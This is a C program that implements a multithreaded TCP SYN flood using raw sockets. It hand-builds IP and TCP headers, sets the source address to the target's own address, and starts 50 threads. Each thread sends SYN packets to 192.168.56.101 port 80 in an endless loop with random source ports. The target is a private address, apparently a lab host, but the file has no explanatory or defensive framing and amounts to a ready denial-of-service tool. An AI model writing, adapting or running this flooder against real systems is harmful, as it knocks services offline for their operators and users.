#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

#include "pseudo_header.h"

#define NUM_THREADS 50


// unsigned short calc_checksum(unsigned short *data, int size);

unsigned short calc_checksum(unsigned short *data, int size) {
    long total_sum;
    unsigned short extra_byte;
    short computed_checksum;
    total_sum = 0;
    while (size > 1) {
        total_sum += *data++;
        size -= 2;
    }
    if (size == 1) {
        extra_byte = 0;
        *((u_char*)&extra_byte) = *(u_char*)data;
        total_sum += extra_byte;  
    }
    total_sum = (total_sum >> 16) + (total_sum & 0xffff);
    total_sum += (total_sum >> 16);
    computed_checksum = (short)~total_sum;
    return(computed_checksum);
}

void *send_packets(void *threadarg) {
    int thread_id = *(int*)threadarg;
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    char datagram[4096], source_ip[32];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in server_addr;
    struct pseudo_header p_header;

    strcpy(source_ip , "192.168.56.101");

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(80);
    server_addr.sin_addr.s_addr = inet_addr(source_ip);
    memset (datagram, 0, 4096);

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr (source_ip);
    iph->daddr = server_addr.sin_addr.s_addr;
    iph->check = calc_checksum((unsigned short *) datagram, iph->tot_len >> 1);

    tcph->source = htons (1234);
    tcph->dest = htons (80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    p_header.src_addr = inet_addr(source_ip);
    p_header.dest_addr = server_addr.sin_addr.s_addr;
    p_header.reserved = 0;
    p_header.protocol_id = IPPROTO_TCP;
    p_header.tcp_len = htons(20);

    memcpy(&p_header.tcp_struct, tcph, sizeof(struct tcphdr));
    tcph->check = calc_checksum((unsigned short*) &p_header, sizeof(struct pseudo_header));

    int flag_val = 1;
    const int *val_ptr = &flag_val;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val_ptr, sizeof (flag_val)) < 0)
    {
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
        exit(0);
    }

    while (1)
    {
        tcph->check = 0;
        tcph->source = htons (rand() + 1024);

        p_header.src_addr = inet_addr( source_ip );
        p_header.dest_addr = server_addr.sin_addr.s_addr;
        p_header.reserved = 0;
        p_header.protocol_id = IPPROTO_TCP;
        p_header.tcp_len = htons(20);

        memcpy(&p_header.tcp_struct , tcph , sizeof (struct tcphdr));

        tcph->check = calc_checksum( (unsigned short*) &p_header , sizeof (struct pseudo_header));

        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0) {
            printf ("error\n");
        }
        else {
            printf("Thread ID: %d - Packet Sent!!\n", thread_id);
        }
    }
}

int main(void) {
    pthread_t threads[NUM_THREADS];
    int thread_args[NUM_THREADS];
    int rc;
    long t;

    for(t = 0; t < NUM_THREADS; t++) {
        thread_args[t] = t;
        rc = pthread_create(&threads[t], NULL, send_packets, (void *)&thread_args[t]);
        if (rc) {
            printf("ERROR; return code from pthread_create() is %d\n", rc);
            exit(-1);
        }
    }

    for(t = 0; t < NUM_THREADS; t++) {
        pthread_join(threads[t], NULL);
    }

    return 0;
}
